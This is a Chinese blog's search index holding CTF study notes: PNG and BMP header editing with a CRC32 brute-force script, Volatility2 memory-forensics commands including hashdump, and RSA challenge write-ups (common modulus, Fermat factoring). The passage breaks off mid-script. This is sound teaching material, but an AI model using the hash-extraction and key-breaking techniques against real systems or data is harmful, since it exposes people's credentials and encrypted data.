<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>常见图片宽高修改</title>
      <link href="/2023/10/21/%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98%E4%BF%AE%E6%94%B9/"/>
      <url>/2023/10/21/%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98%E4%BF%AE%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="BMP图片"><a href="#BMP图片" class="headerlink" title="BMP图片"></a>BMP图片</h1><p><img src="https://imag.keyblue.cn/imag/202310171351008.png" alt="image-20231017135138955"></p><ul><li>文件类型</li></ul><blockquote><p>前两个字节为<code>42 4D</code>字符为<code>BM</code></p></blockquote><ul><li>文件大小</li></ul><blockquote><p>占4个字节，如图中<code>A6 4E 12 00</code>，颠倒后为<code>00 12 4E A6</code>，所以该图片的大小为1199782字节</p></blockquote><ul><li>图片宽度</li></ul><blockquote><p>占4个字节，如图中<code>7A 03 00 00</code>，颠倒后为<code>00 00 03 7A</code>，所以该图片宽度为890像素，约等于<code>文件大小(00 12 4E A6) / 3 / 高度(00 00 01 C1)</code></p></blockquote><ul><li>图片高度</li></ul><blockquote><p>占4个字节，如图中<code>C1  01 00 00</code>，颠倒后为<code>00 00 01 C1</code>，所以该图片的高度为449像素，约等于<code>文件大小(00 12 4E A6) / 3 / 宽度(00 00 03 7A)</code></p></blockquote><h1 id="PNG图片"><a href="#PNG图片" class="headerlink" title="PNG图片"></a>PNG图片</h1><p><img src="https://imag.keyblue.cn/imag/202310171514746.png" alt="image-20231017151428710"></p><ul><li>文件类型</li></ul><blockquote><p>占8个字节，为png的文件头：<code>89 50 4E 47 0D 0A 1A 0A </code>，固定格式</p></blockquote><ul><li>图片宽度</li></ul><blockquote><p>占4个字节，如图<code>00 00 04 14</code>，图片高度为1044像素</p></blockquote><ul><li>图片高度</li></ul><blockquote><p>占4个字节，如图<code>00 00 00 96</code>，图片高度为150像素</p></blockquote><ul><li>CRC32校验块</li></ul><blockquote><p>占4个字节，如图<code>E1 4A 4C 0B</code>，值由从第12个字节到第28个字节的十七位字节进行crc计算得到</p></blockquote><p>PNG图片要计算正确的宽高需要进行CRC32爆破</p><p>CRC32爆破脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> binascii m <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./res/misc.png"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token operator">+</span>m<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">]</span>        crc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>        <span class="token keyword">if</span> crc <span class="token operator">==</span> <span class="token number">0x889C2F07</span><span class="token punctuation">:</span>        <span class="token comment">#目标图片对应的crc值</span>            k <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="JPG图片"><a href="#JPG图片" class="headerlink" title="JPG图片"></a>JPG图片</h1>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Volatility2内存取证常用命令</title>
      <link href="/2023/10/21/Volatility2%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/10/21/Volatility2%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="查看镜像信息-imageinfo"><a href="#查看镜像信息-imageinfo" class="headerlink" title="查看镜像信息(imageinfo)"></a>查看镜像信息(imageinfo)</h2><p>首先使用<code>-f</code>选项来选择镜像文件</p><p>输入命令，以下命令用来查看镜像的系统信息</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.dmp imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-none"><code class="language-none">Volatility Foundation Volatility Framework 2.6INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)                     AS Layer2 : FileAddressSpace (&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;计算机取证&#x2F;1.dmp)                      PAE type : No PAE                           DTB : 0x187000L                          KDBG : 0xf80003ffa0a0L          Number of Processors : 1     Image Type (Service Pack) : 1                KPCR for CPU 0 : 0xfffff80003ffbd00L             KUSER_SHARED_DATA : 0xfffff78000000000L           Image date and time : 2022-04-28 05:54:55 UTC+0000     Image local date and time : 2022-04-28 13:54:55 +0800<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们查看到了<code>Win7SP1x64</code>,这个信息在后面的操作都会用到</p><h2 id="确定系统-–profile"><a href="#确定系统-–profile" class="headerlink" title="确定系统(–profile&#x3D;)"></a>确定系统(–profile&#x3D;)</h2><p>看到了系统信息，接下来就可以确定了</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.dmp --profile&#x3D;Win7SP1x64 imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>想要进行进一步操作，需要指定<code>profile</code>参数</p><h2 id="查看密码的MD5值-hashdump"><a href="#查看密码的MD5值-hashdump" class="headerlink" title="查看密码的MD5值(hashdump)"></a>查看密码的MD5值(hashdump)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.dmp --profile&#x3D;Win7SP1x64 hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用此命令可以查看到windows的用户名明文和密码的md5值</p><p><img src="https://imag.keyblue.cn/imag/202309011510720.png" alt="image-20230901151036671"></p><p>如图，<code>7f21caca5685f10d9e849cc84c340528</code>是用户taqi7的密码的md5值</p><h2 id="查看IE记录-iehistory"><a href="#查看IE记录-iehistory" class="headerlink" title="查看IE记录(iehistory)"></a>查看IE记录(iehistory)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 iehistory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041455706.png" alt="image-20230904145506659"></p><h2 id="查找文件-fliescan"><a href="#查找文件-fliescan" class="headerlink" title="查找文件(fliescan)"></a>查找文件(fliescan)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 fliescan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041500087.png" alt="image-20230904150030043"></p><p>加上管道符可以精确查找目标文件</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 fliescan | grep ssh.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041502213.png" alt="image-20230904150218179"></p><h2 id="文件下载-dumpfiles"><a href="#文件下载-dumpfiles" class="headerlink" title="文件下载(dumpfiles)"></a>文件下载(dumpfiles)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 dumpfiles -Q 0x00000000020bf6a0 -D .&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041505277.png" alt="image-20230904150504247"></p><p>根据文件查找到的-Q参数才能进行文件下载</p><h2 id="历史命令-cmdscan"><a href="#历史命令-cmdscan" class="headerlink" title="历史命令(cmdscan)"></a>历史命令(cmdscan)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 cmdscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041542425.png" alt="image-20230904154233373"></p><p>PowerShell历史命令文件路径为：<code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> ，所以我们直接去filescan<code>ConsoleHost_history.txt</code></p><h2 id="网络连接信息-netscan"><a href="#网络连接信息-netscan" class="headerlink" title="网络连接信息(netscan)"></a>网络连接信息(netscan)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 netscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用此命令可以查看本机ip地址以及进程的网络连接</p><h2 id="导出进程内存数据-memdump"><a href="#导出进程内存数据-memdump" class="headerlink" title="导出进程内存数据(memdump)"></a>导出进程内存数据(memdump)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f OtterCTF.vmem --profile&#x3D;Win7SP1x64 memdump --pid&#x3D;&#39;708&#39; --dump-dir&#x3D;.&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导出后可用<code>strings</code>指令来查看数据，并使用<code>grep</code>指令来筛选，添加<code>-C</code>的选项用来显示匹配内容的后N行内容，例如：</p><pre class="line-numbers language-none"><code class="language-none">strings 708.dmp | grep &#39;Lunar-3&#39; -C 10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用<code>xxd</code>指令打印文件的hexdump信息，例如：</p><pre class="line-numbers language-none"><code class="language-none">xxd 708.dmp | grep &#39;5a0c 0000&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="注册表信息-hivelist"><a href="#注册表信息-hivelist" class="headerlink" title="注册表信息(hivelist)"></a>注册表信息(hivelist)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f OtterCTF.vmem --profile&#x3D;Win7SP1x64 hivelist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202310091657372.png" alt="image-20231009165709332"></p><h2 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h2><p>主机名会出储存在<code>\REGISTRY\MACHINE\SYSTEM</code>中的<code>ControlSet001\Control\ComputerName\ComputerName</code>条目中，可以直接读取</p><p>先使用<code>hivelist</code>查看<code>\REGISTRY\MACHINE\SYSTEM</code>的<code>Virtual</code>值，再使用如下名称即可查看主机名</p><pre class="line-numbers language-none"><code class="language-none">volatility -f OtterCTF.vmem --profile&#x3D;Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202310091701626.png" alt="image-20231009170123583"></p><h2 id="粘贴板-clipboard"><a href="#粘贴板-clipboard" class="headerlink" title="粘贴板(clipboard)"></a>粘贴板(clipboard)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f OtterCTF.vmem --profile&#x3D;Win7SP1x64 clipboard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>简而言之，查看粘贴板信息</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Volatility2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Crypto模块做题记录</title>
      <link href="/2023/09/25/NSSCTF%20Crypto%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/09/25/NSSCTF%20Crypto%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="AFCTF-2018-可怜的RSA"><a href="#AFCTF-2018-可怜的RSA" class="headerlink" title="[AFCTF 2018]可怜的RSA"></a>[AFCTF 2018]可怜的RSA</h1><p>给了<code>flag.enc</code>、<code>public.key</code></p><p>先从public.key获取n和e的值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./res/可怜的RSA/public.key'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    pubkey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> pubkey<span class="token punctuation">.</span>ne <span class="token operator">=</span> pubkey<span class="token punctuation">.</span>e<span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到了n和e的值，需要对n<a href="http://www.factordb.com/">因式分解</a></p><pre class="line-numbers language-none"><code class="language-none">p &#x3D; 3133337q &#x3D; 25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>知道了p😭q，用pow函数计算私钥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>需要注意的是，读取密文后要先base64解码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64 <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./res/可怜的RSA/flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    c <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最终exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP<span class="token keyword">import</span> base64 <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./res/可怜的RSA/public.key'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    pubkey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> pubkey<span class="token punctuation">.</span>ne <span class="token operator">=</span> pubkey<span class="token punctuation">.</span>ep <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>q <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./res/可怜的RSA/flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    c <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>c<span class="token punctuation">)</span>m <span class="token operator">=</span> key<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="BJDCTF-2020-rsa-output"><a href="#BJDCTF-2020-rsa-output" class="headerlink" title="[BJDCTF 2020]rsa_output"></a>[BJDCTF 2020]rsa_output</h1><p>给了一大串数据</p><p>很明显这是要用到共模攻击</p><blockquote><p><strong>共模是指</strong>：就是明文m,相同。用两个公钥e1,e2加密得到两个私钥d1,d2 和两个密文c1,c2<br> <strong>共模攻击</strong>：即当m不变的情况下，知道n,e1,e2,c1,c2, 可以在不知道d1,d2的情况下，解出m</p><p>参考链接：<a href="https://www.cnblogs.com/gwind/p/8013154.html">https://www.cnblogs.com/gwind/p/8013154.html</a></p></blockquote><p>先了解一下拓展欧几里得</p><blockquote><p>展欧几里得算法（简称<strong>扩欧</strong>）是欧几里得算法（又称辗转相除法）的扩展。扩欧可以在求得 a、b的最大公约数的同时，能找到整数 x、y，使它们满足贝祖等式：ax+by &#x3D; gcd(a, b) </p></blockquote><p>最终payload： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span>e1 <span class="token operator">=</span> <span class="token number">2767</span>e2 <span class="token operator">=</span> <span class="token number">3659</span>message1<span class="token operator">=</span><span class="token number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span>message2<span class="token operator">=</span><span class="token number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span><span class="token comment"># 拓展欧几里得</span>s<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> s2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>message1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>message2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="SWPU-2020-happy"><a href="#SWPU-2020-happy" class="headerlink" title="[SWPU 2020]happy"></a>[SWPU 2020]happy</h1><p>c的值后多了个大写L，直接删掉即可，望周知</p><blockquote><p>a &#x3D; q + q * p^3 &#x3D; q * (1 + p^3) &#x3D; q * (1 + p) * (1 - p + p^2)</p><p>b &#x3D; q * p + q * p^2 &#x3D; q * (1 + p) * p</p></blockquote><p>由此可见，a和b的最大公约数为<code>q*(1+p)</code>，所以有</p><blockquote><p>q*(1+p) &#x3D; gcd(a, b)</p><p>p &#x3D; b &#x2F; q*(1+p)</p><p>q &#x3D; b &#x2F; (1+p^3)</p></blockquote><p>所以有</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0x872a335</span><span class="token punctuation">)</span>a <span class="token operator">=</span><span class="token number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span>b <span class="token operator">=</span> <span class="token number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span>gift <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>p <span class="token operator">=</span> b <span class="token operator">//</span> giftq <span class="token operator">=</span> a <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>p<span class="token operator">**</span><span class="token number">3</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="SWPUCTF-2021-新生赛-crypto4"><a href="#SWPUCTF-2021-新生赛-crypto4" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto4"></a>[SWPUCTF 2021 新生赛]crypto4</h1><blockquote><p>由题可知，p 和 q非常接近，这适用于费马定理</p><p>直接将n开平方再取附近质数，判断相乘是否等于n就可以求出p和q</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span>p <span class="token operator">=</span> q <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> n <span class="token operator">!=</span> p <span class="token operator">*</span> q<span class="token punctuation">:</span>    q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> n <span class="token operator">//</span> q<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'p = '</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q = '</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求出了p和q接下来就是正常流程，最终payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2flag <span class="token operator">=</span> <span class="token number">10227915341268619536932290456122384969242151167487654201363877568935534996454863939953106193665663567559506242151019201314446286458150141991211233219320700112533775367958964780047682920839507351492644735811096995884754664899221842470772096509258104067131614630939533042322095150722344048082688772981180270243</span>n <span class="token operator">=</span> <span class="token number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span>e <span class="token operator">=</span> <span class="token number">65537</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> n <span class="token operator">//</span> qn_ <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n_<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token 